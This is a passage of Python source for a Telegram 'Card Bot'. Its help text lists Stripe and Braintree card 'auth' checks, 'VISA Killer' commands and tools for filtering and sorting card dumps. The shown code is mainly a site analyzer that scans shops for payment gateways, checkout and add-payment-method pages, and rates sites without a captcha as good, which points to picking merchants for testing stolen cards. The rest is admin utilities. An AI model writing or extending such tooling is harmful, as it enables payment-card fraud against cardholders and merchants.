            result["cloudflare"] = True
        if "cf-ray" in resp.headers or "cf-cache-status" in resp.headers:
            result["cloudflare"] = True
        
        # ============ EXTRACT & VERIFY CHECKOUT/PAYMENT LINKS ============
        # Goal: only return links that "exist" (not 404/410) and use them to improve gateway detection.
        base_netloc = urlparse(base_url).netloc
        gateways_set: Set[str] = set(result.get("gateways") or [])

        def _is_valid_href(href: str) -> bool:
            h = (href or "").strip().lower()
            if not h:
                return False
            if any(x in h for x in ["javascript:", "mailto:", "tel:", "void", "#"]):
                return False
            if any(h.endswith(ext) for ext in [".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".webp"]):
                return False
            return True

        def _to_full_url(href: str) -> str:
            if href.startswith("http://") or href.startswith("https://"):
                return href
            if href.startswith("//"):
                return "https:" + href
            if href.startswith("/"):
                return base_url + href
            return urljoin(base_url + "/", href)

        def _is_internal(full_url: str) -> bool:
            try:
                return urlparse(full_url).netloc == base_netloc
            except Exception:
                return False

        probe_budget = 15
        probes_used = 0

        def _page_exists_and_scan(full_url: str) -> Tuple[bool, str]:
            """
            Returns (exists, final_url).
            Exists means "not 404/410" (so 401/403 still counts as existing).
            Also opportunistically scans page content for gateway signals.
            """
            # Cheap check first if possible
            head_ok = _head_allows(full_url)
            if head_ok is False:
                return False, full_url

            # If we have a positive HEAD signal but we're out of probe budget,
            # still return the link as "existing" (non-404) without content scanning.
            nonlocal probes_used
            if probes_used >= probe_budget:
                if head_ok is True:
                    return True, full_url
                return False, full_url

            try:
                probes_used += 1
                r = http.get(full_url, headers=headers, timeout=15, allow_redirects=True)
                code = r.status_code
                final = r.url or full_url
                text_lower = (r.text or "").lower()

                if code in (404, 410):
                    return False, final
                if code == 200 and _is_soft_404(text_lower):
                    return False, final

                # If we can read content, scan it for gateways (checkout/payment pages often include the gateway scripts).
                gateways_set.update(_detect_gateways(text_lower))
                return True, final
            except Exception:
                # If HEAD was allowed and not false, treat as unknown; don't claim exists.
                return False, full_url

        # Find all href links
        all_links = re.findall(r'href=["\']([^"\']+)["\']', original_html or "", re.IGNORECASE)
        checkout_keywords = ["checkout", "/cart", "/basket", "/order", "/buy", "/purchase", "place-order", "pay-now"]
        payment_keywords = [
            "add-payment-method", "add-payment", "payment-method", "payment-methods",
            "add-card", "/payment", "my-account/payment", "account/payment",
            "edit-payment", "manage-payment", "wallet", "billing-method", "billing", "card"
        ]

        checkout_candidates: List[str] = []
        payment_candidates: List[str] = []

        for href in all_links:
            if not _is_valid_href(href):
                continue
            full = _to_full_url(href.strip())
            if not _is_internal(full):
                continue
            hl = href.lower()
            if any(k in hl for k in checkout_keywords):
                checkout_candidates.append(full)
            if any(k in hl for k in payment_keywords):
                payment_candidates.append(full)

        # Add common paths as fallbacks (Shopify/WooCommerce patterns)
        common_checkout_paths = ["/checkout", "/checkout/", "/cart", "/cart/", "/basket", "/basket/"]
        common_payment_paths = [
            "/my-account/add-payment-method",
            "/my-account/add-payment-method/",
            "/my-account/payment-methods",
            "/my-account/payment-methods/",
            "/account/add-payment-method",
            "/checkout/add-payment",
            "/my-account/add-card",
        ]

        for p in common_checkout_paths:
            checkout_candidates.append(base_url + p)
        for p in common_payment_paths:
            payment_candidates.append(base_url + p)

        # De-dupe while keeping order
        def _dedupe_keep_order(items: List[str]) -> List[str]:
            out = []
            seen = set()
            for it in items:
                if it in seen:
                    continue
                seen.add(it)
                out.append(it)
            return out

        checkout_candidates = _dedupe_keep_order(checkout_candidates)[:20]
        payment_candidates = _dedupe_keep_order(payment_candidates)[:20]

        # Verify & collect (only real pages, not 404)
        for cand in checkout_candidates:
            if len(result["checkout_links"]) >= 3:
                break
            exists, final = _page_exists_and_scan(cand)
            if exists and final not in result["checkout_links"]:
                result["checkout_links"].append(final)
                result["checkout_page"] = True

        for cand in payment_candidates:
            if len(result["payment_links"]) >= 3:
                break
            exists, final = _page_exists_and_scan(cand)
            if exists and final not in result["payment_links"]:
                result["payment_links"].append(final)
                result["payment_page"] = True

        result["gateways"] = sorted(gateways_set)
        
    except requests.exceptions.Timeout:
        result["error"] = "Timeout"
    except requests.exceptions.SSLError:
        result["error"] = "SSL Error"
    except requests.exceptions.ConnectionError:
        result["error"] = "Connection Failed"
    except Exception as e:
        result["error"] = str(e)[:50]
    finally:
        # Clean exit - close session if we created it
        if session is None:
            try:
                http.close()
            except:
                pass
    
    return result

def _format_site_result_v2(result: dict, index: int = None) -> str:
    """Format site analysis with clean UI (✅/❌ emojis)."""
    idx = f"[{index}] " if index else ""
    
    if result["status"] == "error":
        return (
            f"{'━'*32}\n"
            f"{idx}`{result['url']}`\n"
            f"Status: ❌ {result.get('error', 'Unavailable')}\n"
        )
    
    lines = [f"{'━'*32}"]
    lines.append(f"{idx}`{result['url']}`")
    
    # Status with code
    code = result.get('status_code', 0)
    if code == 200:
        status = f"✅ Online `{code}`"
    elif 200 < code < 400:
        status = f"↗️ Redirect `{code}`"
    else:
        status = f"❌ Error `{code}`"
    
    lines.append(f"Status: {status}")
    lines.append(f"SSL: {'✅ Secure' if result['ssl'] else '❌ Not Secure'}")
    
    # Cloudflare
    if result["cloudflare"]:
        lines.append("Cloudflare: ✅ Protected")
    
    # Platform
    if result["platform"]:
        lines.append(f"Platform: `{', '.join(result['platform'])}`")
    
    # Gateways - important!
    if result["gateways"]:
        lines.append(f"Gateway: ✅ `{', '.join(result['gateways'])}`")
    else:
        lines.append("Gateway: ❌ Not detected")
    
    # Captcha - No captcha = good (✅), Has captcha = bad (❌)
    if result["captcha"]:
        lines.append(f"Captcha: ❌ `{', '.join(result['captcha'])}`")
    else:
        lines.append("Captcha: ✅ Clean (None)")
    
    # Checkout with links
    checkout_links = result.get("checkout_links", [])
    if checkout_links:
        lines.append("Checkout: ✅")
        for u in checkout_links[:3]:
            lines.append(f"• [Open]({u})")
    elif result["checkout_page"]:
        lines.append("Checkout: ✅ Found")
    
    # Payment with links - IMPORTANT for /st type checks
    payment_links = result.get("payment_links", [])
    if payment_links:
        lines.append("Payment: ✅")
        for u in payment_links[:3]:
            lines.append(f"• [Open]({u})")
    elif result["payment_page"]:
        lines.append("Payment: ✅ Found")
    
    return "\n".join(lines)

async def site_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Analyze website(s) for payment gateways, captcha, platform, etc."""
    uid = update.effective_user.id
    is_user_admin = is_admin(uid)
    
    if not is_user_admin and not is_approved(uid, "site"):
        await update.message.reply_text("⛔ You are not approved to use this command.", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("site"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return
    
    raw_input = " ".join(context.args).strip() if context.args else ""
    
    if not raw_input:
        await update.message.reply_text(
            "**Site Analyzer**\n\n"
            "Usage: `/site <url>` or `/site <url1> <url2> ...`\n\n"
            "Example:\n"
            "• `/site example.com`\n"
            "• `/site shop1.com shop2.com`\n\n"
            "Detects:\n"
            "• Payment Gateways (Stripe, Braintree, PayPal...)\n"
            "• Captcha (reCAPTCHA, hCaptcha, Turnstile...)\n"
            "• Platform (Shopify, WooCommerce, Magento...)\n"
            "• Cloudflare, SSL, Checkout/Payment pages\n\n"
            f"Limit: {'Unlimited (Admin)' if is_user_admin else '10 sites'}",
            parse_mode="Markdown",
            reply_to_message_id=update.message.message_id
        )
        return
    
    # Extract URLs (dedupe while preserving order)
    urls = re.split(r'[\s,\n]+', raw_input)
    urls = [u.strip() for u in urls if u.strip() and '.' in u]
    urls = list(dict.fromkeys(urls))
    
    if not urls:
        await update.message.reply_text("No valid URLs found.", reply_to_message_id=update.message.message_id)
        return
    
    # Limit for non-admin users
    max_sites = 999 if is_user_admin else 10
    if len(urls) > max_sites:
        await update.message.reply_text(
            f"Maximum {max_sites} sites allowed. Checking first {max_sites}.",
            reply_to_message_id=update.message.message_id
        )
        urls = urls[:max_sites]
    
    # Initial message
    msg = await _tg_call_with_retry(
        update.message.reply_text,
        f"**Analyzing {len(urls)} site(s)...**\n\nStarting...",
        parse_mode="Markdown",
        reply_to_message_id=update.message.message_id
    )
    
    all_results: List[Optional[dict]] = [None] * len(urls)

    # Run blocking HTTP analysis in background threads.
    # Concurrency is capped so one user can't overwhelm the box.
    loop = asyncio.get_running_loop()
    sem = asyncio.Semaphore(max(1, SITE_THREADS))

    started = 0
    completed = 0
    last_progress_at = 0.0

    async def _one(idx: int, u: str) -> None:
        nonlocal completed, started, last_progress_at
        async with sem:
            started += 1
            now = time.time()
            if now - last_progress_at >= 0.8:
                last_progress_at = now
                try:
                    await _tg_call_with_retry(
                        msg.edit_text,
                        f"**Analyzing {len(urls)} site(s)...**\n\n"
                        f"Progress: `{completed}/{len(urls)}` | Active: `{started - completed}`\n"
                        f"Now: `{u[:40]}`",
                        parse_mode="Markdown",
                    )
                except Exception:
                    pass

            # Run analysis off the event loop (requests is blocking)
            res = await loop.run_in_executor(_executor, _analyze_site, u, None)
            all_results[idx] = res
            completed += 1

    tasks = [asyncio.create_task(_one(i, u)) for i, u in enumerate(urls)]
    await asyncio.gather(*tasks)

    # Fill any missing entries defensively
    for i in range(len(all_results)):
        if all_results[i] is None:
            all_results[i] = {"url": urls[i], "status": "error", "error": "Unknown", "status_code": None, "ssl": False, "platform": [], "gateways": [], "captcha": [], "cloudflare": False, "checkout_page": False, "payment_page": False, "checkout_links": [], "payment_links": []}
    
    # Build output
    output = [f"**Site Analysis** — {len(urls)} site{'s' if len(urls) > 1 else ''}\n"]
    
    for i, result in enumerate(all_results, 1):
        if len(urls) > 1:
            output.append(_format_site_result_v2(result, i))
        else:
            output.append(_format_site_result_v2(result))
    
    output.append(f"{'━'*30}")
    final_output = "\n".join(output)

    # If too long, send in multiple messages (no truncation).
    max_len = 3800  # keep margin for Markdown/Telegram limits
    chunks = []
    cur_lines = []
    cur_len = 0
    for line in final_output.splitlines():
        add_len = len(line) + (1 if cur_lines else 0)
        if cur_lines and (cur_len + add_len) > max_len:
            chunks.append("\n".join(cur_lines))
            cur_lines = [line]
            cur_len = len(line)
        else:
            cur_lines.append(line)
            cur_len += add_len
    if cur_lines:
        chunks.append("\n".join(cur_lines))

    await _tg_call_with_retry(msg.edit_text, chunks[0], parse_mode="Markdown", disable_web_page_preview=True)
    for extra in chunks[1:]:
        await _tg_call_with_retry(
            update.message.reply_text,
            extra,
            parse_mode="Markdown",
            disable_web_page_preview=True,
            reply_to_message_id=update.message.message_id,
        )

# ==== 4.4 Admin Commands: /on and /off ====
async def on_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enable a command"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admin only command.", reply_to_message_id=update.message.message_id)
        return
    
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /on <command>\nExample: /on bin", reply_to_message_id=update.message.message_id)
        return
    
    cmd = context.args[0].lower().strip()
    
    if cmd not in CMD_KEYS:
        await update.message.reply_text(f"❌ Invalid command. Available commands: {', '.join(CMD_KEYS)}", reply_to_message_id=update.message.message_id)
        return
    
    cmd_status[cmd] = True
    save_users()
    
    await update.message.reply_text(f"✅ Command `{cmd}` has been enabled.", parse_mode="Markdown", reply_to_message_id=update.message.message_id)

async def off_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Disable a command"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admin only command.", reply_to_message_id=update.message.message_id)
        return
    
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /off <command>\nExample: /off bin", reply_to_message_id=update.message.message_id)
        return
    
    cmd = context.args[0].lower().strip()
    
    if cmd not in CMD_KEYS:
        await update.message.reply_text(f"❌ Invalid command. Available commands: {', '.join(CMD_KEYS)}", reply_to_message_id=update.message.message_id)
        return
    
    cmd_status[cmd] = False
    save_users()
    
    await update.message.reply_text(f"✅ Command `{cmd}` has been disabled.", parse_mode="Markdown", reply_to_message_id=update.message.message_id)


# ==== 4.4.1 Admin Utilities: /ram, /cleanram, /backup ====
def _fmt_bytes(n: Union[float, int]) -> str:
    try:
        n = float(n)
    except Exception:
        return "N/A"
    units = ["B", "KB", "MB", "GB", "TB", "PB"]
    i = 0
    while n >= 1024 and i < len(units) - 1:
        n /= 1024.0
        i += 1
    if i == 0:
        return f"{int(n)} {units[i]}"
    return f"{n:.2f} {units[i]}"


async def ram_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show runtime stats (RAM/CPU/Disk/Uptime). Admin only."""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admin only command.", reply_to_message_id=update.message.message_id)
        return

    uptime = format_timedelta(datetime.now() - start_time)
    proc = psutil.Process(os.getpid())

    # CPU
    cpu_count = psutil.cpu_count(logical=True) or 0
    cpu_phys = psutil.cpu_count(logical=False) or 0
    try:
        load1, load5, load15 = os.getloadavg()
        load_txt = f"{load1:.2f}, {load5:.2f}, {load15:.2f}"
    except Exception:
        load_txt = "N/A"

    # Memory
    vm = psutil.virtual_memory()
    sm = psutil.swap_memory()
    pm = proc.memory_info()

    # Disk ("ROM" in your wording)
    try:
        root_du = shutil.disk_usage("/")
        root_disk = f"{_fmt_bytes(root_du.used)} / {_fmt_bytes(root_du.total)} ({(root_du.used / root_du.total * 100.0):.1f}%)"
    except Exception:
        root_disk = "N/A"

    try:
        cwd = os.getcwd()
    except Exception:
        cwd = "/"

    try:
        cwd_du = shutil.disk_usage(cwd)
        cwd_disk = f"{_fmt_bytes(cwd_du.used)} / {_fmt_bytes(cwd_du.total)} ({(cwd_du.used / cwd_du.total * 100.0):.1f}%)"
    except Exception:
        cwd_disk = "N/A"

    # Process details
    try:
        threads = proc.num_threads()
    except Exception:
        threads = "N/A"
    try:
        fds = proc.num_fds()
    except Exception:
        fds = "N/A"

    text = (
        "🧠 *Bot Runtime Details*\n\n"
        f"⏱ *Uptime:* `{uptime}`\n"
        f"🖥 *Platform:* `{platform.platform()}`\n"
        f"🐍 *Python:* `{platform.python_version()}`\n"
        f"🧩 *PID:* `{os.getpid()}`\n\n"
        "⚙️ *CPU*\n"
        f"• vCPU (logical): `{cpu_count}`\n"
        f"• CPU (physical): `{cpu_phys}`\n"
        f"• Load avg (1/5/15): `{load_txt}`\n\n"
        "💾 *RAM*\n"
        f"• Total: `{_fmt_bytes(vm.total)}`\n"
        f"• Used: `{_fmt_bytes(vm.used)}` ({vm.percent}%)\n"
        f"• Available: `{_fmt_bytes(vm.available)}`\n"
        f"• Process RSS: `{_fmt_bytes(pm.rss)}`\n"
        f"• Process VMS: `{_fmt_bytes(pm.vms)}`\n"
        f"• Threads: `{threads}`\n"
        f"• Open FDs: `{fds}`\n\n"
        "🧷 *Swap*\n"
        f"• Total: `{_fmt_bytes(sm.total)}`\n"
        f"• Used: `{_fmt_bytes(sm.used)}` ({sm.percent}%)\n\n"
        "💽 *Disk*\n"
        f"• `/`: `{root_disk}`\n"
        f"• `{cwd}`: `{cwd_disk}`\n"
    )
    await update.message.reply_text(text, parse_mode="Markdown", reply_to_message_id=update.message.message_id)


def _kill_orphan_chrome_children() -> dict:
    """
    Best-effort cleanup: terminate chrome/chromedriver child processes.
    This can free RAM if Selenium got stuck, but may interrupt running checks.
    """
    proc = psutil.Process(os.getpid())
    killed = 0
    failed = 0
    targets = []
    try:
        targets = proc.children(recursive=True)
    except Exception:
        targets = []

    for p in targets:
        try:
            name = (p.name() or "").lower()
            if "chromedriver" not in name and "chrome" not in name:
                continue
            p.terminate()
            killed += 1
        except Exception:
            failed += 1

    # Give them a moment, then hard kill leftovers
    try:
        gone, alive = psutil.wait_procs(targets, timeout=2)
        for p in alive:
            try:
                name = (p.name() or "").lower()
                if "chromedriver" in name or "chrome" in name:
                    p.kill()
            except Exception:
                failed += 1
    except Exception:
        pass

    return {"terminated": killed, "failed": failed}


async def cleanram_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Best-effort memory cleanup. Admin only."""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admin only command.", reply_to_message_id=update.message.message_id)
        return

    before = psutil.Process(os.getpid()).memory_info().rss

    # Python-level cleanup
    try:
        gc.collect()
    except Exception:
        pass

    # Clear a couple of known caches
    try:
        bin_cache.clear()
    except Exception:
        pass

    killed_info = None
    # Optional: /cleanram kill -> try to terminate chrome/chromedriver children
    if context.args and context.args[0].lower().strip() in ("kill", "force"):
        killed_info = _kill_orphan_chrome_children()

    after = psutil.Process(os.getpid()).memory_info().rss
    freed = before - after

    msg = (
        "🧹 *CleanRAM complete*\n"
        f"• RSS before: `{_fmt_bytes(before)}`\n"
        f"• RSS after: `{_fmt_bytes(after)}`\n"
        f"• Freed (approx): `{_fmt_bytes(freed)}`\n"
    )
    if killed_info:
        msg += f"• Chrome cleanup: terminated `{killed_info['terminated']}`, failed `{killed_info['failed']}`\n"
    msg += "\n_Note: memory may not drop immediately due to allocator/OS behavior._"
    await update.message.reply_text(msg, parse_mode="Markdown", reply_to_message_id=update.message.message_id)


async def backup_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Zip and send project backups to admin."""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admin only command.", reply_to_message_id=update.message.message_id)
        return

    base_dir = os.path.dirname(os.path.abspath(__file__))
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    zip_name = f"backup_{ts}.zip"

    status = await update.message.reply_text("📦 Creating backup...", reply_to_message_id=update.message.message_id)

    tmp_path = None
    try:
        fd, tmp_path = tempfile.mkstemp(prefix="bot_backup_", suffix=".zip")
        os.close(fd)

        with zipfile.ZipFile(tmp_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(base_dir):
                # Skip junk folders
                dirs[:] = [d for d in dirs if d not in (".git", "__pycache__", ".venv", "venv", "node_modules")]

                for fn in files:
                    if fn.endswith((".pyc", ".tmp")):
                        continue
                    if not (fn.endswith(".py") or fn.endswith(".json") or fn in ("Dockerfile", "Dockerfile.txt")):
                        continue
                    abs_path = os.path.join(root, fn)
                    rel_path = os.path.relpath(abs_path, base_dir)
                    zf.write(abs_path, rel_path)

        with open(tmp_path, "rb") as f:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=f,
                filename=zip_name,
                caption=f"✅ Backup created: `{zip_name}`",
                parse_mode="Markdown",
                reply_to_message_id=update.message.message_id,
            )
        await status.edit_text("✅ Backup sent.")
    except Exception as e:
        await status.edit_text(f"❌ Backup failed: {str(e)[:200]}")
    finally:
        if tmp_path and os.path.exists(tmp_path):
            try:
                os.remove(tmp_path)
            except Exception:
                pass


async def log_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send recent container/runtime logs to admin as a text file."""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admin only command.", reply_to_message_id=update.message.message_id)
        return

    # Optional: /log 5000 -> last 5000 lines
    lines_req = None
    if context.args:
        try:
            lines_req = int(context.args[0])
        except Exception:
            lines_req = None

    with _log_lock:
        data = list(_log_lines)

    if lines_req and lines_req > 0:
        data = data[-min(lines_req, len(data)) :]

    content = "".join(data)
    if not content.strip():
        content = "No logs captured yet.\n"

    # Cap payload to avoid huge Telegram uploads (keep last ~3MB)
    b = content.encode("utf-8", errors="ignore")
    max_bytes = 3 * 1024 * 1024
    if len(b) > max_bytes:
        b = b[-max_bytes:]

    bio = BytesIO(b)
    bio.name = f"container_logs_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}Z.txt"

    await _tg_call_with_retry(
        context.bot.send_document,
        chat_id=update.effective_chat.id,
        document=bio,
        filename=bio.name,
        caption=f"✅ Logs ({len(b) / 1024:.1f} KB)",
        reply_to_message_id=update.message.message_id,
    )


async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin-only broadcast message to all known users (approved + per-cmd)."""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admin only command.", reply_to_message_id=update.message.message_id)
        return

    text = " ".join(context.args).strip() if context.args else ""
    if not text and update.message.reply_to_message:
        text = (update.message.reply_to_message.text or "").strip()

    if not text:
        await update.message.reply_text(
            "📣 Usage: `/broadcast <message>`\nOr reply to a message with `/broadcast`",
            parse_mode="Markdown",
            reply_to_message_id=update.message.message_id,
        )
        return

    # Build recipient list
    recipients = set()
    try:
        recipients.update(approved_all)
    except Exception:
        pass
    try:
        for s in approved_cmds.values():
            recipients.update(s)
    except Exception:
        pass
    try:
        recipients.add(BOT_ADMIN_ID)
    except Exception:
        pass
    try:
        recipients.difference_update(banned_users)
    except Exception:
        pass

    recipients = {int(x) for x in recipients if str(x).isdigit()}
    if not recipients:
        await update.message.reply_text("No recipients found.", reply_to_message_id=update.message.message_id)
        return

    status = await update.message.reply_text(
        f"📣 Broadcasting to {len(recipients)} users...",
        reply_to_message_id=update.message.message_id,
    )

    sent = 0
    failed = 0
    sem = asyncio.Semaphore(15)

    async def _send_one(uid: int) -> None:
        nonlocal sent, failed
        async with sem:
            try:
                await _tg_call_with_retry(
                    context.bot.send_message,
                    chat_id=uid,
                    text=text,
                    disable_web_page_preview=True,
                )
                sent += 1
            except Exception:
                failed += 1

    tasks = [asyncio.create_task(_send_one(uid)) for uid in sorted(recipients)]
    await asyncio.gather(*tasks)

    await status.edit_text(f"✅ Broadcast done.\n\nSent: {sent}\nFailed: {failed}")

# ==== 4.5 Basic Bot Commands ====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Welcome! Use /cmds to see available commands.", reply_to_message_id=update.message.message_id)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "🤖 *Card Bot Help*\n\n"
        "🔐 *Auth Commands:*\n"
        "• /st <card> - Stripe Auth V1\n"
        "• /bt <card> - Braintree Auth-1\n"
        "• /chk <card> - Braintree Auth-2\n\n"
        "🗡️ *Visa Killer Commands:*\n"
        "• /kill <card> - VISA Killer\n"
        "• /kd <card> - VISA Killer #2\n"
        "• /ko <card> - VISA Killer #3\n"
        "• /zz <card> - Killed v5 (fast)\n"
        "• /dd <card> - Killed v6 (ultra-fast)\n\n"
        "🔧 *Data Processing:*\n"
        "• /filter <data|file|URL> - Fast card filter\n"
        "• /clean <data|file|URL> - Advanced cleaner\n"
        "• /sort <data|file|URL> - Clean & sort cards\n"
        "• /split [size] - Split large files (reply)\n"
        "• /merge - Merge multiple files into one\n"
        "• /bin <bins/cards> - BIN lookup\n\n"
        "🌐 *Large Files (100-500MB):*\n"
        "Upload to transfer.sh, file.io, catbox.moe,\n"
        "pastebin, dropbox, etc. Then use:\n"
        "`/sort <URL>` or `/clean <URL>` or `/filter <URL>`\n\n"
        "🔍 *Details Fetching:*\n"
        "• /site <url> - Analyze website gateway\n"
        "• /jork <url> - Video downloader\n\n"
        "🧰 *Basic Commands:*\n"
        "• /start - Welcome message\n"
        "• /help - This help message\n"
        "• /cmds - Command list\n"
        "• /id - Your Telegram ID\n"
        "• /status - Bot status\n"
        "• /version - Bot version info\n\n"
        "📝 *Card Format:*\n"
        "`CC|MM|YY|CVV` or `CC MM YY CVV`\n\n"
        "⚠️ *Note:* Some commands require admin approval."
    )
    await update.message.reply_text(help_text, parse_mode="Markdown", reply_to_message_id=update.message.message_id)

async def id_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = user.id

    # Grade: S=admin, A=approved (any), D=not approved
    if is_admin(uid):
        grade = "S"
    else:
        is_any_approved = uid in approved_all or any(uid in approved_cmds[k] for k in CMD_KEYS)
        grade = "A" if is_any_approved else "D"

    name = " ".join([p for p in [user.first_name, user.last_name] if p]) or "N/A"
    username = f"@{user.username}" if user.username else "N/A"

    caption = (
        "👤 *User Info*\n\n"
        f"• *Name:* `{name}`\n"
        f"• *Username:* `{username}`\n"
        f"• *User ID:* `{uid}`\n"
        f"• *Grade:* `{grade}`\n"
    )

    # Send profile photo if available. If Telegram returns an animated/video profile file,
    # try sending it as an animation first. Otherwise, fallback to a generic GIF ("gift").
    try:
        photos = await context.bot.get_user_profile_photos(user_id=uid, limit=1)
        if photos.total_count and photos.photos:
            file_id = photos.photos[0][-1].file_id  # highest resolution of first photo set
            try:
                f = await context.bot.get_file(file_id)
                file_path = (getattr(f, "file_path", "") or "").lower()
                is_animated = file_path.endswith((".mp4", ".gif", ".webm"))
            except Exception:
                is_animated = False

            if is_animated:
                try:
                    await context.bot.send_animation(
                        chat_id=update.effective_chat.id,
                        animation=file_id,
                        caption=caption,
                        parse_mode="Markdown",
                        reply_to_message_id=update.message.message_id,
                    )
                    return
                except Exception:
                    pass

            await context.bot.send_photo(
                chat_id=update.effective_chat.id,
                photo=file_id,
                caption=caption,
                parse_mode="Markdown",
                reply_to_message_id=update.message.message_id,
            )
            return
    except Exception:
        pass

    try:
        await context.bot.send_animation(
            chat_id=update.effective_chat.id,
            animation="https://media.giphy.com/media/JIX9t2j0ZTN9S/giphy.gif",
            caption=caption,
            parse_mode="Markdown",
            reply_to_message_id=update.message.message_id,
        )
    except Exception:
        await update.message.reply_text(caption, parse_mode="Markdown", reply_to_message_id=update.message.message_id)

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uptime = format_timedelta(datetime.now() - start_time)
    t0 = time.perf_counter()
    msg = await update.message.reply_text("⏳ Checking status...", reply_to_message_id=update.message.message_id)
    ping_ms = (time.perf_counter() - t0) * 1000.0
    await msg.edit_text(f"✅ Bot is running.\n⏱ Uptime: {uptime}\n🏓 Ping: {ping_ms:.0f} ms")

async def version_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Public command: show build/runtime version info."""
    uptime = format_timedelta(datetime.now() - start_time)
    py = sys.version.split()[0]
    plat = f"{platform.system()} {platform.release()}"
    await update.message.reply_text(
        "\n".join(
            [
                "ℹ️ *Version Info*",
                f"• *App:* `{APP_VERSION}`",
                f"• *Python:* `{py}`",
                f"• *Platform:* `{plat}`",
                f"• *Uptime:* `{uptime}`",
            ]
        ),
        parse_mode="Markdown",
        reply_to_message_id=update.message.message_id,
    )

async def health_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Admin-only real-time health check.

    Includes:
    - Telegram API reachability (real-time)
    - DNS reachability (real-time)
    - Chrome/Chromedriver presence + version (real-time)
    - Selenium smoke test (real-time, cached briefly unless forced)
    - Historical command health stats (based on success/failure counters)
    """
    uid = update.effective_user.id
    
    # Admin only
    if not is_admin(uid):
        await update.message.reply_text("⛔ This command is for admins only.", reply_to_message_id=update.message.message_id)
        return

    # Args
    arg0 = (context.args[0].lower().strip() if context.args else "")
    force = arg0 in ("force", "deep", "test")

    # Reset mode (historical counters only)
    if arg0 == "reset":
        if len(context.args) > 1:
            cmd_to_reset = context.args[1].lower().strip()
            if cmd_to_reset in BROWSER_CMDS:
                reset_cmd_health(cmd_to_reset)
                await _tg_call_with_retry(
                    update.message.reply_text,
                    f"✅ Health stats reset for `/{cmd_to_reset}`",
                    parse_mode="Markdown",
                    reply_to_message_id=update.message.message_id,
                )
                return
        reset_cmd_health()
        await _tg_call_with_retry(
            update.message.reply_text,
            "✅ All health stats have been reset!",
            reply_to_message_id=update.message.message_id,
        )
        return

    status_msg = await _tg_call_with_retry(
        update.message.reply_text,
        "⏳ Running health checks...",
        reply_to_message_id=update.message.message_id,
    )

    loop = asyncio.get_running_loop()

    # --- Real-time checks ---
    # 1) Telegram API
    api_ok = False
    api_ms = None
    api_err = None
    t0 = time.perf_counter()
    try:
        await _tg_call_with_retry(context.bot.get_me)
        api_ok = True
        api_ms = int((time.perf_counter() - t0) * 1000)
    except Exception as e:
        api_ok = False
        api_err = str(e)[:120]

    # 2) DNS resolution
    def _dns_check() -> Tuple[bool, str]:
        try:
            import socket
            ip = socket.gethostbyname("api.telegram.org")
            return True, ip
        except Exception as e:
            return False, str(e)[:120]

    dns_ok, dns_info = await loop.run_in_executor(_executor, _dns_check)

    # 3) System stats (real time)
    try:
        mem = psutil.virtual_memory()
        cpu = psutil.cpu_percent(interval=0.1)
        mem_used = mem.percent
    except Exception:
        mem_used = 0.0
        cpu = 0.0

    # 4) Chrome/Driver presence + version
    def _bin_exists(p: str) -> bool:
        try:
            return os.path.exists(p)
        except Exception:
            return False

    chrome_ok = _bin_exists(CHROME_PATH)
    driver_ok = _bin_exists(CHROME_DRIVER_PATH)

    def _version_cmd(cmd: List[str]) -> str:
        try:
            import subprocess
            out = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=6)
            return (out.decode("utf-8", errors="ignore").strip() or "unknown")[:120]
        except Exception as e:
            return f"error: {str(e)[:90]}"

    chrome_ver = await loop.run_in_executor(_executor, _version_cmd, [CHROME_PATH, "--version"]) if chrome_ok else "missing"
    driver_ver = await loop.run_in_executor(_executor, _version_cmd, [CHROME_DRIVER_PATH, "--version"]) if driver_ok else "missing"

    # 5) Selenium smoke test (cached unless forced)
    # Cache globals (module-level) for last selenium test
    global _last_selenium_health  # type: ignore[name-defined]
    try:
        _last_selenium_health
    except Exception:
        _last_selenium_health = {"ts": 0.0, "ok": False, "ms": None, "err": "not run"}

    def _selenium_smoke() -> dict:
        import time as _t
        t_start = _t.time()
        acquired = False
        try:
            acquired = _browser_semaphore.acquire(timeout=2)
            if not acquired:
                return {"ok": False, "ms": int((_t.time() - t_start) * 1000), "err": "All browser slots busy"}

            # Minimal fast options (avoid fake_useragent network)
            opts = webdriver.ChromeOptions()
            opts.binary_location = CHROME_PATH
            opts.add_argument("--headless=new")
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            opts.add_argument("--disable-gpu")
            opts.add_argument("--disable-extensions")
            opts.add_argument("--disable-features=site-per-process,TranslateUI")
            opts.add_argument("--blink-settings=imagesEnabled=false")
